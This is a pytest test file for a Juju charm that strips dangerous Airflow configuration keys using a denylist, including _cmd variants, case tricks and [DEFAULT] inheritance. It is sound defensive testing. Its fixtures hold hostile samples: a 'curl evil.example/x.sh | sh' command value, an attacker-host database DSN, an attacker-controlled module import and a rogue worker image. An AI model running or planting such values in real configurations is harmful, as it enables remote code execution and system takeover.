# Copyright 2026 Canonical Ltd.
# See LICENSE file for licensing details.

"""Tests for Layer 2 denylist validation (spec WF029 section 3.2.2 / 3.4)."""

import configparser

import ops
import ops.testing
import pytest

import charm as charm_module
import denylist
from charm import AirflowProviderConfiguratorCharm

GIT_RELATION = "remote-airflow-provider-configurations"
PROVIDER_RELATION = "airflow-provider-configuration"
FILE_PATH_CONFIG = "airflow_provider_configurations_file_path"

# A denied key (core.dags_folder) alongside a benign one; the denied key must be
# dropped and the benign one preserved.
INI_WITH_DENIED_KEY = """\
[core]
dags_folder = /tmp/evil

[gcs]
conn_id = default_gcp
"""


# --------------------------------------------------------------------------- #
# Pure module tests (no charm harness).
# --------------------------------------------------------------------------- #


def test_load_denylist_includes_shipped_keys():
    """The shipped denylist.yaml loads and denies the spec's example key.

    The spec's example is `core.dags_folder`; the shipped list covers it by
    denying the whole `core` section rather than naming the option.
    """
    loaded = denylist.load_denylist()
    assert isinstance(loaded, frozenset)
    assert "core" in loaded
    assert denylist._matches("core.dags_folder", loaded)


def test_shipped_denylist_stays_short():
    """Layer 2 is a short, reviewable list by design (spec 3.2.2).

    Anything that grows with what the coordinator happens to render belongs in
    Layer 1; see documentation/adr/0001-layer-2-denylist-scope.md. The bound is
    a tripwire for that discussion, not a hard limit.
    """
    assert len(denylist.load_denylist()) <= 10


@pytest.mark.parametrize(
    "content",
    [
        "",  # empty file
        "deny:\n",  # key present but null
        "deny: []\n",  # key present but empty
        "something_else: [a]\n",  # no deny key at all
        "deny: not-a-list\n",  # wrong shape
        "deny: [unclosed\n",  # not valid YAML
    ],
)
def test_load_denylist_fails_closed(tmp_path, content):
    """An unusable denylist raises rather than silently disabling Layer 2.

    The file ships with the charm, so none of these states can be produced by an
    operator: they mean the guard itself is broken. Returning an empty set would
    publish provider configuration with no Layer 2 validation and no sign of it.
    """
    path = tmp_path / "denylist.yaml"
    path.write_text(content)

    with pytest.raises(denylist.DenylistUnavailableError):
        denylist.load_denylist(path)


def test_load_denylist_fails_closed_when_file_is_missing(tmp_path):
    """A denylist that is not there at all is a charm fault, not an empty list."""
    with pytest.raises(denylist.DenylistUnavailableError):
        denylist.load_denylist(tmp_path / "does-not-exist.yaml")


def test_shipped_denylist_entries_are_well_formed():
    """Every shipped entry is a lower-case section or "section.option" pair.

    Matching lowercases both sides, so an upper-case entry would still work, but
    keeping the file canonical makes it reviewable at a glance (spec 3.2.2 calls
    for team review of this list).
    """
    entries = denylist.load_denylist()
    for entry in entries:
        assert entry == entry.lower().strip(), entry
        section, _, option = entry.partition(".")
        assert section, entry
        if not option:
            # A whole-section entry; nothing further to check.
            continue
        # An option entry is redundant when its section is denied outright.
        assert section not in entries, f"{entry} is implied by section {section}"
        # The `_cmd` / `_secret` variants are implied by the suffix rule and must
        # not be listed separately, or the list drifts out of sync with itself.
        #
        # Checked by stripping the suffix rather than by rejecting the suffix
        # outright: an option whose own name ends in `_secret` is a real option,
        # not the `_secret` variant of a shorter one. An entry is redundant only
        # when the stripped form is *also* listed.
        for suffix in denylist.SENSITIVE_VALUE_SUFFIXES:
            if option.endswith(suffix):
                base = f"{section}.{option[: -len(suffix)]}"
                assert base not in entries, f"{entry} is implied by {base}"


def test_apply_denylist_drops_from_non_sensitive_ini():
    """A denied key is removed from the .ini; a benign key survives."""
    filtered_ini, filtered_sensitive, dropped = denylist.apply_denylist(
        INI_WITH_DENIED_KEY, {}, denylist=frozenset({"core.dags_folder"})
    )

    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)

    # Denied key gone; its now-empty section removed; benign key untouched.
    assert not parser.has_section("core")
    assert parser.get("gcs", "conn_id") == "default_gcp"
    assert filtered_sensitive == {}
    assert dropped == ["core.dags_folder"]


def test_apply_denylist_drops_from_sensitive_map():
    """A denied key supplied as a sensitive value is dropped; others kept."""
    sensitive = {"core": {"dags_folder": "/tmp/evil", "some_token": "hunter2"}}
    filtered_ini, filtered_sensitive, dropped = denylist.apply_denylist(
        "", sensitive, denylist=frozenset({"core.dags_folder"})
    )

    assert filtered_sensitive == {"core": {"some_token": "hunter2"}}
    assert dropped == ["core.dags_folder"]


def test_apply_denylist_no_match_is_passthrough():
    """With nothing denied, inputs pass through and nothing is dropped."""
    sensitive = {"gcs": {"key": "value"}}
    filtered_ini, filtered_sensitive, dropped = denylist.apply_denylist(
        INI_WITH_DENIED_KEY, sensitive, denylist=frozenset()
    )

    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)

    assert parser.get("core", "dags_folder") == "/tmp/evil"
    assert filtered_sensitive == {"gcs": {"key": "value"}}
    assert dropped == []


def test_apply_denylist_dedupes_and_sorts_dropped():
    """A key denied in both inputs is reported once; result is sorted."""
    sensitive = {"core": {"plugins_folder": "s"}}
    _, _, dropped = denylist.apply_denylist(
        "[core]\ndags_folder = x\nplugins_folder = y\n",
        sensitive,
        denylist=frozenset({"core.dags_folder", "core.plugins_folder"}),
    )
    assert dropped == ["core.dags_folder", "core.plugins_folder"]


def test_apply_denylist_drops_denied_option_from_default_section():
    """A denied option hidden in [DEFAULT] is really removed, not just reported.

    configparser inherits [DEFAULT] options into every section and refuses to
    remove an inherited option from an individual section, so a naive filter
    reports the drop while write() still emits the value.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        "[DEFAULT]\ndags_folder = /tmp/evil\n\n[core]\nparallelism = 32\n",
        {},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert dropped == ["DEFAULT.dags_folder"]
    # The value must be absent from the serialised output, under any section.
    assert "dags_folder" not in filtered_ini
    assert "/tmp/evil" not in filtered_ini

    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)
    assert not parser.has_option("core", "dags_folder")
    # The benign sibling in the same section survives.
    assert parser.get("core", "parallelism") == "32"


def test_apply_denylist_keeps_section_holding_only_inherited_defaults():
    """A section whose own options were all dropped is removed, defaults aside.

    parser.options() reports inherited defaults too, so the empty-section check
    must look only at a section's own options.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        "[DEFAULT]\nparallelism = 32\n\n[core]\ndags_folder = /tmp/evil\n",
        {},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert dropped == ["core.dags_folder"]
    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)
    # [core] held nothing but the denied key, so it should be gone...
    assert not parser.has_section("core")
    # ...while the untouched default is preserved.
    assert parser.defaults() == {"parallelism": "32"}


@pytest.mark.parametrize(
    "ini",
    [
        "[core]\nDAGS_FOLDER = /tmp/evil\n",
        "[CORE]\ndags_folder = /tmp/evil\n",
        "[Core]\nDags_Folder = /tmp/evil\n",
    ],
)
def test_apply_denylist_matching_is_case_insensitive(ini):
    """Casing must not bypass the denylist.

    Airflow lowercases option names when it reads airflow.cfg, so `DAGS_FOLDER`
    is the very same setting as `dags_folder` and is honoured just the same. A
    case-sensitive denylist would therefore be bypassed with the shift key.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        ini, {}, denylist=frozenset({"core.dags_folder"})
    )

    assert len(dropped) == 1
    assert "/tmp/evil" not in filtered_ini


def test_apply_denylist_matching_is_case_insensitive_in_denylist_entry():
    """An upper-case entry in denylist.yaml still matches a lower-case option."""
    _, _, dropped = denylist.apply_denylist(
        "[core]\ndags_folder = /tmp/evil\n", {}, denylist=frozenset({"CORE.DAGS_FOLDER"})
    )

    assert dropped == ["core.dags_folder"]


@pytest.mark.parametrize("suffix", ["_cmd", "_secret"])
def test_apply_denylist_covers_cmd_and_secret_variants(suffix):
    """Denying an option also denies its `_cmd` / `_secret` variants.

    Airflow accepts `<option>_cmd` in place of `<option>` and runs its value as a
    shell command, so leaving the variant open would hand over exactly the code
    execution the bare option was denied for. Layer 1 cannot cover it either: the
    coordinator renders the bare option, so the variant collides with nothing.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        f"[core]\ndags_folder{suffix} = /tmp/evil\n",
        {},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert dropped == [f"core.dags_folder{suffix}"]
    assert "/tmp/evil" not in filtered_ini


def test_apply_denylist_covers_cmd_variant_in_default_section():
    """The `_cmd` variant is caught in [DEFAULT] too, where inheritance applies."""
    filtered_ini, _, dropped = denylist.apply_denylist(
        "[DEFAULT]\nDAGS_FOLDER_CMD = /tmp/evil\n\n[core]\nparallelism = 32\n",
        {},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert dropped == ["DEFAULT.DAGS_FOLDER_CMD"]
    assert "/tmp/evil" not in filtered_ini


def test_apply_denylist_covers_cmd_variant_in_sensitive_map():
    """A `_cmd` variant smuggled through the Juju secret is dropped as well."""
    _, filtered_sensitive, dropped = denylist.apply_denylist(
        "",
        {"core": {"dags_folder_cmd": "curl evil.example/x.sh | sh"}},
        denylist=frozenset({"core.dags_folder"}),
    )

    assert filtered_sensitive == {}
    assert dropped == ["core.dags_folder_cmd"]


def test_apply_denylist_suffix_rule_does_not_overreach():
    """An unrelated option that merely ends in `_cmd` is not dropped.

    The suffix only implies a denial when the *base* option is itself denied.
    """
    _, _, dropped = denylist.apply_denylist(
        "[gcs]\nconn_id_cmd = lookup-conn\n", {}, denylist=frozenset({"core.dags_folder"})
    )

    assert dropped == []


# --------------------------------------------------------------------------- #
# Whole-section entries.
# --------------------------------------------------------------------------- #


def test_apply_denylist_drops_every_option_in_a_denied_section():
    """A bare section entry denies all of its options, named or not.

    This is what keeps the shipped list short and makes it hold when a future
    Airflow release adds options to a denied section.
    """
    filtered_ini, filtered_sensitive, dropped = denylist.apply_denylist(
        "[core]\ndags_folder = /tmp/evil\nsome_option_added_in_3_2 = x\n\n"
        "[gcs]\nconn_id = default_gcp\n",
        {"core": {"fernet_key": "s"}, "gcs": {"key_path": "/k"}},
        denylist=frozenset({"core"}),
    )

    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)

    assert not parser.has_section("core")
    assert parser.get("gcs", "conn_id") == "default_gcp"
    assert filtered_sensitive == {"gcs": {"key_path": "/k"}}
    assert dropped == ["core.dags_folder", "core.fernet_key", "core.some_option_added_in_3_2"]


def test_apply_denylist_section_entry_does_not_match_a_bare_option():
    """A section entry must not be read as an option name.

    [DEFAULT] options are matched on their bare name, with no section half. A
    section entry sharing that name must not match there by accident.
    """
    filtered_ini, _, dropped = denylist.apply_denylist(
        "[DEFAULT]\ncore = something\n\n[gcs]\nconn_id = default_gcp\n",
        {},
        denylist=frozenset({"core"}),
    )

    assert dropped == []
    assert "something" in filtered_ini


def test_apply_denylist_denied_default_section_drops_every_default():
    """Denying `default` removes all [DEFAULT] options, which every section inherits."""
    filtered_ini, _, dropped = denylist.apply_denylist(
        "[DEFAULT]\nanything = /tmp/evil\n\n[gcs]\nconn_id = default_gcp\n",
        {},
        denylist=frozenset({"default"}),
    )

    assert dropped == ["DEFAULT.anything"]
    assert "/tmp/evil" not in filtered_ini

    parser = configparser.RawConfigParser()
    parser.optionxform = str
    parser.read_string(filtered_ini)
    assert parser.defaults() == {}
    assert parser.get("gcs", "conn_id") == "default_gcp"


def test_shipped_denylist_blocks_the_sections_the_adr_names():
    """End-to-end over the real shipped list, not a test fixture."""
    _, _, dropped = denylist.apply_denylist(
        "[core]\ndags_folder = /tmp/evil\n\n"
        "[api]\nexpose_config = true\n\n"
        "[dag_processor]\ndag_bundle_config_list = []\n\n"
        "[webserver]\nsecret_key = hunter2\n\n"
        "[fab]\nauth_backends = airflow.api.auth.backend.default\n\n"
        "[gcs]\nconn_id = default_gcp\n",
        {},
    )

    assert dropped == [
        "api.expose_config",
        "core.dags_folder",
        "dag_processor.dag_bundle_config_list",
        "fab.auth_backends",
        "webserver.secret_key",
    ]


def test_shipped_denylist_blocks_unrendered_worker_image_options():
    """ADR 0001 decision 6: the gap Layer 1 does not cover.

    The executor charm renders `namespace`, `pod_template_file` and
    `base_image`, so Layer 1 drops those. It renders neither
    `worker_container_repository` nor `worker_container_tag`, so without a
    Layer 2 entry those two would reach airflow.cfg untouched and redirect
    worker pods at an arbitrary image.
    """
    ini, _, dropped = denylist.apply_denylist(
        "[kubernetes_executor]\n"
        "worker_container_repository = evil.registry/airflow\n"
        "worker_container_tag = latest\n\n"
        "[gcs]\nconn_id = default_gcp\n",
        {},
    )

    assert dropped == [
        "kubernetes_executor.worker_container_repository",
        "kubernetes_executor.worker_container_tag",
    ]
    assert "evil.registry" not in ini
    assert "default_gcp" in ini


def test_shipped_denylist_blocks_unrendered_api_auth_options():
    """ADR 0001 decision 6, the second partially rendered section.

    The coordinator renders one line of [api_auth], `jwt_secret`. The rest of
    the section reaches Layer 2 uncovered and decides how API tokens are signed
    and accepted. The options below are representative, not exhaustive: the
    entry denies the section.
    """
    ini, _, dropped = denylist.apply_denylist(
        "[api_auth]\n"
        "jwt_secret = attacker-signing-key\n"
        "jwt_algorithm = none\n"
        "jwt_issuer = evil\n\n"
        "[gcs]\nconn_id = default_gcp\n",
        {},
    )

    assert dropped == [
        "api_auth.jwt_algorithm",
        "api_auth.jwt_issuer",
        "api_auth.jwt_secret",
    ]
    assert "attacker-signing-key" not in ini
    assert "default_gcp" in ini


def test_shipped_denylist_blocks_unrendered_database_options():
    """ADR 0001 decision 6, the third partially rendered section.

    The coordinator renders 2 of 19 options. `sql_alchemy_session_maker` and
    the `connect_args` pair are read with `conf.getimport()` in
    airflow/settings.py, so setting one imports an arbitrary module at startup;
    `sql_alchemy_conn_async` is a second DSN.
    """
    ini, _, dropped = denylist.apply_denylist(
        "[database]\n"
        "sql_alchemy_conn = postgresql://attacker@evil.example.com:5432/pwned\n"
        "sql_alchemy_conn_async = postgresql+asyncpg://attacker@evil.example.com/pwned\n"
        "sql_alchemy_connect_args = evil.module.connect_args\n"
        "sql_alchemy_session_maker = evil.module.session_maker\n\n"
        "[gcs]\nconn_id = default_gcp\n",
        {},
    )

    assert dropped == [
        "database.sql_alchemy_conn",
        "database.sql_alchemy_conn_async",
        "database.sql_alchemy_connect_args",
        "database.sql_alchemy_session_maker",
    ]
    assert "evil.example.com" not in ini
    assert "evil.module" not in ini
    assert "default_gcp" in ini


def test_load_denylist_honours_a_patched_module_path(tmp_path, monkeypatch):
    """``DENYLIST_PATH`` is resolved at call time, not bound as a default.

    A default argument would bind the shipped path at import, so this patch
    would be a silent no-op and the test would pass for the wrong reason.
    """
    stand_in = tmp_path / "denylist.yaml"
    stand_in.write_text('deny: ["sentinel.entry"]\n')
    monkeypatch.setattr(denylist, "DENYLIST_PATH", stand_in)

    assert denylist.load_denylist() == frozenset({"sentinel.entry"})


def test_shipped_denylist_leaves_shared_provider_sections_alone():
    """Layer 2 guards Airflow's own sections, not every shared one.

    The spec's canonical provider file writes to [secrets] and [logging], and
    spec 3.1 defends that as legitimate -- `secrets.backend` is an import path,
    which is exactly the kind of configuration this charm exists to relay.
    """
    _, _, dropped = denylist.apply_denylist(
        "[secrets]\nbackend = airflow.providers.hashicorp.secrets.vault.VaultBackend\n\n"
        "[logging]\nremote_logging = True\n\n"
        "[google]\nkey_path = /k\n",
        {},
    )

    assert dropped == []


# --------------------------------------------------------------------------- #
# Charm-level wiring tests.
# --------------------------------------------------------------------------- #


@pytest.fixture
def context():
    return ops.testing.Context(charm_type=AirflowProviderConfiguratorCharm)


def _container_with_ini(tmp_path, ini_text):
    """A reachable git-sync container with the given .ini mounted at /git/repo."""
    repo_dir = tmp_path / "repo"
    repo_dir.mkdir(exist_ok=True)
    (repo_dir / "providers.ini").write_text(ini_text)
    return ops.testing.Container(
        name="git-sync",
        can_connect=True,
        mounts={"content": ops.testing.Mount(location="/git/repo", source=repo_dir)},
    )


def _git_relation():
    return ops.testing.Relation(
        GIT_RELATION,
        interface="git",
        remote_app_data={
            "repository-url": "https://github.com/example/provider-config",
            "tracking-ref": "main",
        },
    )


def _provider_relation():
    return ops.testing.Relation(PROVIDER_RELATION, interface="airflow_provider_configuration")


def _peer_relation(local_app_data=None):
    return ops.testing.PeerRelation(
        "replicas",
        interface="airflow_provider_configurator_replica",
        local_app_data=local_app_data or {},
    )


def test_denied_key_dropped_and_status_set(context, tmp_path):
    """A denied key is dropped from the published config; unit Active with a message.

    Covers the full spec 3.4 contract for a violation: dropped, logged at
    WARNING naming the key and the layer, status message set, unit not blocked,
    and the rest of the file still published.
    """
    container = _container_with_ini(tmp_path, INI_WITH_DENIED_KEY)
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    state_out = context.run(context.on.relation_changed(git_relation), state)

    # Non-blocking: Active, with a message naming the dropped key.
    assert isinstance(state_out.unit_status, ops.ActiveStatus)
    assert "core.dags_folder" in state_out.unit_status.message

    # A WARNING naming the key and the layer that caught it (spec 3.4).
    warnings = [line.message for line in context.juju_log if line.level == "WARNING"]
    assert any("core.dags_folder" in m and "Layer 2" in m for m in warnings)

    # The published template carries the benign key but not the denied one.
    out_provider = state_out.get_relation(provider_relation.id)
    published = out_provider.local_app_data["provider-configuration"]
    assert "conn_id" in published
    assert "dags_folder" not in published


def test_no_denied_key_is_plain_active(context, tmp_path):
    """Config free of denied keys publishes cleanly with a plain Active status."""
    container = _container_with_ini(tmp_path, "[gcs]\nconn_id = default_gcp\n")
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    state_out = context.run(context.on.relation_changed(git_relation), state)

    assert state_out.unit_status == ops.ActiveStatus()


def test_dropped_status_survives_dedup(context, tmp_path):
    """On a deduped reconcile (unchanged content) the dropped-keys status persists."""
    container = _container_with_ini(tmp_path, INI_WITH_DENIED_KEY)
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation, _peer_relation()],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    # First run publishes and stores the content hash.
    state_after_first = context.run(context.on.relation_changed(git_relation), state)
    assert "core.dags_folder" in state_after_first.unit_status.message

    # Second run with the same content dedups the publish, but the status must
    # still name the dropped key (drops are recorded before the dedup).
    state_out = context.run(context.on.update_status(), state_after_first)
    assert isinstance(state_out.unit_status, ops.ActiveStatus)
    assert "core.dags_folder" in state_out.unit_status.message


def test_dropped_key_logged_as_warning(context, tmp_path):
    """Each drop logs a WARNING naming the section, option and the layer (spec 3.4)."""
    container = _container_with_ini(tmp_path, INI_WITH_DENIED_KEY)
    git_relation = _git_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, _provider_relation()],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    context.run(context.on.relation_changed(git_relation), state)

    warnings = [line.message for line in context.juju_log if line.level == "WARNING"]
    assert any("core.dags_folder" in message and "Layer 2" in message for message in warnings), (
        warnings
    )


@pytest.mark.parametrize(
    "ini",
    [
        "dags_folder = /tmp/evil\n",  # no section header
        "[core]\nparallelism = 1\nparallelism = 2\n",  # duplicate option
        "[core]\nx = 1\n[core]\ny = 2\n",  # duplicate section
        "<<<<<<< HEAD\nnot ini at all\n",  # unresolved merge conflict
    ],
)
def test_malformed_ini_blocks_instead_of_erroring(context, tmp_path, ini):
    """A file configparser rejects blocks the unit rather than erroring the hook.

    configparser raises on these inputs. Letting that propagate would put the
    unit in Juju's error state and retry the hook forever; a file that cannot be
    parsed is an authoring mistake just like a missing one (spec 1.3), so it
    blocks and waits for the next sync to bring a corrected file.
    """
    container = _container_with_ini(tmp_path, ini)
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    state_out = context.run(context.on.relation_changed(git_relation), state)

    assert state_out.unit_status == ops.BlockedStatus(charm_module.MALFORMED_CONFIG_FILE_MESSAGE)
    # Nothing half-parsed should have reached the coordinator.
    out_provider = state_out.get_relation(provider_relation.id)
    assert out_provider.local_app_data == {}


def test_malformed_ini_does_not_clear_published_config(context, tmp_path):
    """A file that goes malformed leaves the last good config in place.

    Blocking is the right response, but it must not look like an empty config:
    clearing the databag would make the coordinator drop working provider
    settings because of a typo in a commit (spec 2.2 cleanup is for an *empty*
    config, not one that cannot be read).
    """
    container = _container_with_ini(tmp_path, "[gcs]\nconn_id = default_gcp\n")
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation, _peer_relation()],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    # Publish a good configuration first.
    state_after_good = context.run(context.on.relation_changed(git_relation), state)
    published = state_after_good.get_relation(provider_relation.id).local_app_data
    assert published.get("provider-configuration")

    # The repository is then updated with a broken file.
    (tmp_path / "repo" / "providers.ini").write_text("<<<<<<< HEAD\nbroken\n")
    state_out = context.run(context.on.update_status(), state_after_good)

    assert state_out.unit_status == ops.BlockedStatus(charm_module.MALFORMED_CONFIG_FILE_MESSAGE)
    assert state_out.get_relation(provider_relation.id).local_app_data == published


def test_denylist_unavailable_blocks_instead_of_publishing(context, tmp_path, monkeypatch):
    """A denylist that cannot be loaded blocks, rather than publishing unvalidated.

    The non-blocking rule (spec 3.4) covers a denied key in the provider's own
    configuration. This is the guard itself failing, which is a charm fault, so
    it gets the same treatment as a missing config file (spec 1.3).

    load_denylist is patched rather than DENYLIST_PATH: the path is a default
    argument, bound when the function is defined, so rebinding the module
    attribute would not reach it. What the loader rejects is covered directly by
    the test_load_denylist_fails_closed cases.
    """

    def _unavailable(*args, **kwargs):
        raise denylist.DenylistUnavailableError("denylist.yaml is missing")

    monkeypatch.setattr(denylist, "load_denylist", _unavailable)

    container = _container_with_ini(tmp_path, "[gcs]\nconn_id = default_gcp\n")
    git_relation = _git_relation()
    provider_relation = _provider_relation()
    state = ops.testing.State(
        leader=True,
        containers=[container],
        relations=[git_relation, provider_relation],
        config={FILE_PATH_CONFIG: "providers.ini"},
    )

    state_out = context.run(context.on.relation_changed(git_relation), state)

    assert state_out.unit_status == ops.BlockedStatus(charm_module.DENYLIST_UNAVAILABLE_MESSAGE)
    # Nothing may reach the coordinator while Layer 2 is not enforceable.
    assert state_out.get_relation(provider_relation.id).local_app_data == {}
